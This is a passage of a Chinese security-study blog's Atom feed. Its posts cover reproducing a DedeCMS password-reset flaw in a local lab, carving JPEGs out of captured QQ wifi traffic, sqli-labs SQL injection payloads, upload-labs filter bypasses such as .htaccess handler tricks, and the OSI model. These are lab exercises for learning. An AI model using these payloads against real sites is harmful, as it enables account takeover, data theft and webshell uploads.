&lt;li&gt;由于 php 弱类型比较形成绕过&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;限制：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;只影响前台账户&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;只能修改未设置安全问题的账户&lt;/p&gt;
&lt;hr&gt;
&lt;hr&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;复现内容&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现内容&#34;&gt;#&lt;/a&gt; 复现内容：&lt;/h2&gt;
&lt;p&gt;1. 首先使用 phpstudy 搭建本地服务并安装织梦 cms&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;red&#34;&gt;在建站是遇到一些问题没有办法访问&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;解决方案：在 [hosts].{label} 中手动添加&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;1.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;2.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;3.png&#34; alt&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;注册并安装好数据库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册并安装好数据库&#34;&gt;#&lt;/a&gt; 注册并安装好数据库&lt;/h4&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;要把会员功能开放并且无密保问题&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img data-src=&#34;4.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;5.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;6.png&#34; alt&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;开始使用漏洞修改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开始使用漏洞修改&#34;&gt;#&lt;/a&gt; 开始使用漏洞修改&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;7.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;8.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;9.png&#34; alt&gt;&lt;/p&gt;
&lt;p class=&#34;label warning&#34;&gt;[注意一个账号只能访问改密码页面一次，否则要等 10 分钟 key 失效].&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;10.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;11.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;12.jpg&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;13.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;到此漏洞复现成功&lt;/mark&gt;&lt;/p&gt;
&lt;h2 id=&#34;更改后台admin密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更改后台admin密码&#34;&gt;#&lt;/a&gt; 更改后台 admin 密码&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;14s.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;15.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight diff&#34;&gt;&lt;figcaption data-lang=&#34;diff&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;直接访问该链接，即可重置admin前台为任意密码。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;重置admin前台密码之后，注意不要退出，继续留着cookie，继续进行修改admin后台密码&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;16.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;访问：系统设置 -&amp;gt; 个人资料 -&amp;gt; 基本资料&lt;br&gt;
即&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://192.168.170.139/member/edit_baseinfo.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;17.png&#34; alt&gt;&lt;/p&gt;
&lt;div class=&#34;note danger&#34;&gt;
&lt;p&gt;进行后端密码更改之前，不能纯用 bp 发报文。这样浏览器拿不到重要 cookies 会导致无法依靠 cookie 使 admin 前台登录（登录界面禁用 admin 直接登录）&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFpL2FydGljbGUvZGV0YWlscy84Mzk5NjMxMj91dG1fdGVybT1kZWRlY21zJUU2JTk0JUI5JUU1JUFGJTg2JUU3JUEwJTgxJUU2JUJDJThGJUU2JUI0JTlFJUU1JUE0JThEJUU3JThFJUIwJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUud2FwX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5hbGx+c29iYWlkdXdlYn5kZWZhdWx0LTEtODM5OTYzMTImYW1wO3NwbT0xMDE4LjIxMTguMzAwMS40MTg3&#34;&gt;网页链接：DeDeCMS v5.7 {SP1,SP2} 密码修改漏洞（附 PoC）&lt;/span&gt;&lt;/p&gt;
</content>
        <category term="homework" scheme="https://sovegetable.github.io/tags/homework/" />
        <updated>2020-10-24T10:40:34.000Z</updated>
    </entry>
    <entry>
        <id>https://sovegetable.github.io/qqshark/</id>
        <title>qq流量包分析</title>
        <link rel="alternate" href="https://sovegetable.github.io/qqshark/"/>
        <content type="html">&lt;h2 id=&#34;qq流量分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#qq流量分析&#34;&gt;#&lt;/a&gt; QQ 流量分析&lt;/h2&gt;
&lt;hr&gt;
&lt;p&gt;&lt;mark&gt;使用工具 ：Wireshark&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../source/assets/u=3726352782,2540904049&amp;amp;fm=26&amp;amp;gp=0.jpg&#34; alt&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;略缩图不见了&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#略缩图不见了&#34;&gt;#&lt;/a&gt; 略缩图不见了！！！&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;1.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;2.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;半张图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#半张图&#34;&gt;#&lt;/a&gt; 半张图&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;本来是是一张 1.6MB 的完整的图，流量截取后 出现错误&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;3.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;4.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;尝试了很多次发现只有大图片会发生不完整，推测是分成了两部分或多部分传输&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;hxd的图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hxd的图&#34;&gt;#&lt;/a&gt; hxd 的图&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;意外抓到了别人的图，是因为 wifi 抓包的缘故（无线信号）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;5.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;成功的尝试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#成功的尝试&#34;&gt;#&lt;/a&gt; 成功的尝试&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;6.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;输入判断条件：tcp and ip.dst==192.168.0.19&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;hex 搜索： ffd8&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;7.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;8.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;找到文件拖到本地还原&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;9.png&#34; alt&gt;&lt;/p&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;p&gt;删除多余的报文 header，还原图片&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img data-src=&#34;10.png&#34; alt&gt;&lt;/p&gt;
&lt;details class=&#34;primary&#34;&gt;&lt;summary&gt;总结&lt;/summary&gt;&lt;div&gt;
&lt;div class=&#34;note info&#34;&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;抓取文件格式只能是 jpg 格式，png gif pdf doc 文件均加密&lt;/li&gt;
&lt;li&gt;大小号之间发图片都是加密的（用户和用户通信都加密）&lt;/li&gt;
&lt;li&gt;大文件会分段传输，大小在 1MB 以下的话方便完整图片&lt;/li&gt;
&lt;li&gt;wifi 传输并不安全&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;&lt;/details&gt;
</content>
        <category term="homework" scheme="https://sovegetable.github.io/tags/homework/" />
        <updated>2020-10-17T13:36:36.000Z</updated>
    </entry>
    <entry>
        <id>https://sovegetable.github.io/sqlilabs%201~6/</id>
        <title>sqlilabs payload</title>
        <link rel="alternate" href="https://sovegetable.github.io/sqlilabs%201~6/"/>
        <content type="html">&lt;h1 id=&#34;less-1~4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-1~4&#34;&gt;#&lt;/a&gt; less 1~4&lt;/h1&gt;
&lt;p&gt;select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#39; 库名 &#39; LIMIT 0,1  // 爆表（一次一个）&lt;/p&gt;
&lt;p&gt;select group_concat (table_name) from information_schema.tables where table_schema=0x7365637572697479 // 爆表 （全部）前面是数据库 16 进制的编码&lt;/p&gt;
&lt;p&gt;select group_concat (column_name) from information_schema.columns where table_name=0x656d61696c73 // 爆字段 前面是数据库 16 进制的编码&lt;/p&gt;
&lt;p&gt;select group_concat (id 字段名 1，email_id 字段名 2 。。。。) from email（表名）// 爆单个数据&lt;/p&gt;
&lt;h1 id=&#34;报错注入-less-56&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入-less-56&#34;&gt;#&lt;/a&gt; 报错注入 （less-5，6）&lt;/h1&gt;
&lt;p&gt;首先利用盲注的方法获取表名等，然后报错注入回显。（针对页面无回显点）&lt;/p&gt;
&lt;p&gt;id=-1&#39; OR 1 GROUP BY CONCAT_WS (0x3a,database (),FLOOR (RAN (0)*2)) HAVING MIN (0) OR 1 --+ // 库&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbC5jb20vTGVzcy01Lz9pZD0x&#34;&gt;http://sql.com/Less-5/?id=1&lt;/span&gt;&#39; and extractvalue (1,concat (0x23,(select table_name from information_schema.tables where table_schema=database () limit 0,1),0x23))--+// 表&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbC5jb20vTGVzcy01Lz9pZD0x&#34;&gt;http://sql.com/Less-5/?id=1&lt;/span&gt;&#39; and extractvalue (1,concat (0x23,(select column_name from information_schema.columns where table_schema=database () and table_name=&#39;users&#39; limit 0,1),0x23))--+  // 字段&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbC5jb20vTGVzcy01Lz9pZD0x&#34;&gt;http://sql.com/Less-5/?id=1&lt;/span&gt;&#39; and length ((select table_name from information_schema.tables where table_schema=database () limit 0,1))&amp;gt;6--+// 长度判断&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpL0xlc3MtNS8/aWQ9MSVFMiU4MCU5OQ==&#34;&gt;http://127.0.0.1/sqli/Less-5/?id=1’&lt;/span&gt; and  ascii (substr ((select schema_name from information_schema.schemata limit 1,1),1,1)) &amp;gt;100--+ 通过二分法猜解得到所有的库，红色为可变参数。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpL0xlc3MtNS8/aWQ9MSVFMiU4MCU5OQ==&#34;&gt;http://127.0.0.1/sqli/Less-5/?id=1’&lt;/span&gt; and ascii (substr ((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))&amp;gt;1--+  再次通过二分法可猜解得到 security 下的所有表。其中，红色为可变参数。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpL0xlc3MtNS8/aWQ9MSVFMiU4MCU5OQ==&#34;&gt;http://127.0.0.1/sqli/Less-5/?id=1’&lt;/span&gt; and ascii (substr ((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) &amp;gt;1 --+  通过二分法可猜解 users 内的字段，其中红色为可变参数。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpL0xlc3MtNS8/aWQ9MSVFMiU4MCU5OQ==&#34;&gt;http://127.0.0.1/sqli/Less-5/?id=1’&lt;/span&gt;  and ascii (substr ((select username from security.users limit 1,1),1,1))&amp;gt;1--+ 继续猜解即可得到字段内的值。&lt;/p&gt;
</content>
        <updated>2020-08-17T11:51:14.287Z</updated>
    </entry>
    <entry>
        <id>https://sovegetable.github.io/OSI%E4%B8%83%E5%B1%82%E5%8D%8F%E8%AE%AE/</id>
        <title>What is OSI七层协议</title>
        <link rel="alternate" href="https://sovegetable.github.io/OSI%E4%B8%83%E5%B1%82%E5%8D%8F%E8%AE%AE/"/>
        <content type="html">&lt;h1 id=&#34;osi七层协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#osi七层协议&#34;&gt;#&lt;/a&gt; OSI 七层协议&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pbWctbXkuY3Nkbi5uZXQvdXBsb2Fkcy8yMDEyMDEvNS8wXzEzMjU3NDQ1OTdXTTMyLmdpZg==&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;第一层物理层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一层物理层&#34;&gt;#&lt;/a&gt; 第一层：物理层&lt;/h2&gt;
&lt;p&gt;用于传输介质中提供物理连接，实现比特流的透明传输。物理层的作用是实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异。使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流” 表示经实际电路传送后的比特流没有发生变化，对传送的比特流来说，这个电路好像是看不见的。&lt;/p&gt;
&lt;h2 id=&#34;第二层数据链路层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二层数据链路层&#34;&gt;#&lt;/a&gt; 第二层：数据链路层&lt;/h2&gt;
&lt;p&gt;负责建立和管理节点间的链路。该层的主要功能是：通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。&lt;br&gt;
在计算机网络中由于各种干扰的存在，物理链路是不可靠的。因此，这一层的主要功能是在物理层提供的比特流的基础上，通过差错控制、流量控制方法，使有差错的物理线路变为无差错的数据链路，即提供可靠的通过物理介质传输数据的方法。&lt;/p&gt;
&lt;p&gt;大致是用于局域网里的根据端口的 MAC 地址做转发的协议&lt;/p&gt;
&lt;h2 id=&#34;第三层网络层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第三层网络层&#34;&gt;#&lt;/a&gt; 第三层：网络层&lt;/h2&gt;
&lt;p&gt;主要功能是控制子网的运行。通过路由选择算法，为报文或分组通过通信子网选择最适当的路径。该层控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。具体地说，数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进 / 出路由等控制，将信息从一个网络设备传送到另一个网络设备。&lt;br&gt;
一般地，数据链路层是解决同一网络内节点之间的通信，而网络层主要解决不同子网间的通信。例如在广域网之间通信时，必然会遇到路由（即两节点间可能有多条路径）选择问题。&lt;/p&gt;
&lt;p&gt;选择最好的路由线路，已获得最好的速度，比如有三条路可以走这层协议负责选取最短的路径。&lt;/p&gt;
&lt;h2 id=&#34;第四层传输层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第四层传输层&#34;&gt;#&lt;/a&gt; 第四层：传输层&lt;/h2&gt;
&lt;p&gt;该层的主要任务是：向用户提供可靠的端到端的差错和流量控制，保证报文的正确传输。传输层的作用是向高层屏蔽下层数据通信的细节，即向用户透明地传送报文。该层常见的协议：TCP/IP 中的 TCP 协议、Novell 网络中的 SPX 协议和微软的 NetBIOS/NetBEUI 协议。&lt;br&gt;
传输层提供会话层和网络层之间的传输服务，这种服务从会话层获得数据，并在必要时，对数据进行分割。然后，传输层将数据传递到网络层，并确保数据能正确无误地传送到网络层。因此，传输层负责提供两节点之间数据的可靠传送，当两节点的联系确定之后，传输层则负责监督工作。综上，传输层的主要功能如下：&lt;br&gt;
传输连接管理：提供建立、维护和拆除传输连接的功能。传输层在网络层的基础上为高层提供 “面向连接” 和 “面向无接连” 的两种服务。&lt;br&gt;
处理传输差错：提供可靠的 “面向连接” 和不太可靠的 “面向无连接” 的数据传输服务、差错控制和流量控制。在提供 “面向连接” 服务时，通过这一层传输的数据将由目标设备确认，如果在指定的时间内未收到确认信息，数据将被重发。&lt;br&gt;
监控服务质量。&lt;/p&gt;
&lt;p&gt;负责数据包的重组和排序，从网络层获取的碎片式的数据包重新排序成原文。&lt;/p&gt;
&lt;h2 id=&#34;第五层会话层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第五层会话层&#34;&gt;#&lt;/a&gt; 第五层：会话层&lt;/h2&gt;
&lt;p&gt;主要任务是：向两个实体的表示层提供建立和使用连接的方法。将不同实体之间的表示层的连接称为会话。因此会话层的任务就是组织和协调两个会话进程之间的通信，并对数据交换进行管理。&lt;br&gt;
会话层的具体功能如下：&lt;br&gt;
会话管理：允许用户在两个实体设备之间建立、维持和终止会话，并支持它们之间的数据交换。例如提供单方向会话或双向同时会话，并管理会话中的发送顺序，以及会话所占用时间的长短。&lt;br&gt;
会话流量控制：提供会话流量控制和交叉会话功能。&lt;br&gt;
寻址：使用远程地址建立会话连接。&lt;br&gt;
出错控制：从逻辑上讲会话层主要负责数据交换的建立、保持和终止，但实际的工作却是接收来自传输层的数据，并负责纠正错误。会话控制和远程过程调用均属于这一层的功能。但应注意，此层检查的错误不是通信介质的错误，而是磁盘空间、打印机缺纸等类型的高级错误。&lt;/p&gt;
&lt;p&gt;为两端通信实体建立连接（会话），中间有认证鉴权以及检查点记录（供会话意外中断的时候可以继续，类似断点续传）。&lt;/p&gt;
&lt;h2 id=&#34;第六层表示层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第六层表示层&#34;&gt;#&lt;/a&gt; 第六层：表示层&lt;/h2&gt;
&lt;p&gt;其主要功能是 “处理用户信息的表示问题，如编码、数据格式转换和加密解密” 等。表示层的具体功能如下：&lt;br&gt;
数据格式处理：协商和建立数据交换的格式，解决各应用程序之间在数据格式表示上的差异。&lt;br&gt;
数据的编码：处理字符集和数字的转换。例如由于用户程序中的数据类型（整型或实型、有符号或无符号等）、用户标识等都可以有不同的表示方式，因此，在设备之间需要具有在不同字符集或格式之间转换的功能。&lt;br&gt;
压缩和解压缩：为了减少数据的传输量，这一层还负责数据的压缩与恢复。&lt;br&gt;
数据的加密和解密：可以提高网络的安全。&lt;/p&gt;
&lt;p&gt;决定数据的展现（编码）形式，如同一部电影可以采样、量化、编码为 RMVB、AVI，一张图片能够是 JPEG、BMP、PNG 等。&lt;/p&gt;
&lt;h2 id=&#34;第七层应用层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第七层应用层&#34;&gt;#&lt;/a&gt; 第七层：应用层&lt;/h2&gt;
&lt;p&gt;它是计算机用户，以及各种应用程序和网络之间的接口，其功能是直接向用户提供服务，完成用户希望在网络上完成的各种工作。它在其他 6 层工作的基础上，负责完成网络中应用程序与网络操作系统之间的联系，建立与结束使用者之间的联系，并完成网络用户提出的各种网络服务及应用所需的监督、管理和服务等各种协议。此外，该层还负责协调各个应用程序间的工作。&lt;/p&gt;
&lt;p&gt;如邮箱使用的 POP3，SMTP、远程登录使用的 Telnet、获取 IP 地址的 DHCP、域名解析的 DNS、网页浏览的 http 协议等；这部分协议主要是规定应用软件如何去进行通信的。&lt;/p&gt;
&lt;h2 id=&#34;osi7层模型的小结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#osi7层模型的小结&#34;&gt;#&lt;/a&gt; OSI7 层模型的小结&lt;/h2&gt;
&lt;p&gt;由于 OSI 是一个理想的模型，因此一般网络系统只涉及其中的几层，很少有系统能够具有所有的 7 层，并完全遵循它的规定。&lt;br&gt;
在 7 层模型中，每一层都提供一个特殊的网络功能。从网络功能的角度观察：下面 4 层（物理层、数据链路层、网络层和传输层）主要提供数据传输和交换功能，即以节点到节点之间的通信为主；第 4 层作为上下两部分的桥梁，是整个网络体系结构中最关键的部分；而上 3 层（会话层、表示层和应用层）则以提供用户与应用程序之间的信息和数据处理功能为主。简言之，下 4 层主要完成通信子网的功能，上 3 层主要完成资源子网的功能。&lt;/p&gt;
</content>
        <updated>2020-08-12T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://sovegetable.github.io/uploadlabs/</id>
        <title>uploadlabs解析</title>
        <link rel="alternate" href="https://sovegetable.github.io/uploadlabs/"/>
        <content type="html">&lt;p&gt;第一关：&lt;br&gt;
前端 js 函数白名单过滤&lt;br&gt;
方法 1：BP 抓包改文件，先把 php 后缀改成白名单里的，然后抓包在改回来绕过前端&lt;br&gt;
方法 2：在浏览器设置里关闭 js 函数&lt;br&gt;
方法 3：在 consel 里运行改过的 html 源码（亲测未成功，js 路径报错）&lt;/p&gt;
&lt;p&gt;第二关：&lt;br&gt;
对于 content-type 的检验&lt;br&gt;
 BP 将 text/plain 改为 image/gif&lt;/p&gt;
&lt;p&gt;第三关：&lt;br&gt;
黑名单后缀&lt;br&gt;
用类似等效的后缀代替（亦或是大小写）&lt;br&gt;
比如说:.phtml .phps .php5 .pht，但如果上传的是.php5 这种类型文件的话，如果想要被当成 php 执行的话，需要有个前提条件，即 Apache 的 httpd.conf 有如下配置代码&lt;br&gt;
大小写都可 如.PhP .pHP (亲测失败)&lt;/p&gt;
&lt;p&gt;第四关：&lt;br&gt;
更全的黑名单&lt;br&gt;
.htaccess，于是首先上传一个.htaccess 内容如下的文件:&lt;br&gt;
SetHandler application/x-httpd-php&lt;br&gt;
 这样所有文件都会解析为 php，然后再上传图片马，就可以解析：&lt;/p&gt;
&lt;p&gt;第五关：&lt;br&gt;
黑名单，加上了.htaccess，但是没有将后缀进行大小写统一，于是可以通过大小写绕过，在 content-disposition filename=xxx.phP&lt;/p&gt;
</content>
        <updated>2020-08-10T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://sovegetable.github.io/hello-world/</id>
        <title>Hello World</title>
        <link rel="alternate" href="https://sovegetable.github.io/hello-world/"/>
        <content type="html">&lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3plc3BpYS50dy9oZXhv&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3plc3BpYS50dy9oZXhvL2RvY3M=&#34;&gt;documentation&lt;/span&gt; to learn how to use.&lt;/p&gt;
</content>
        <updated>2013-12-24T09:49:32.000Z</updated>
    </entry>
</feed>
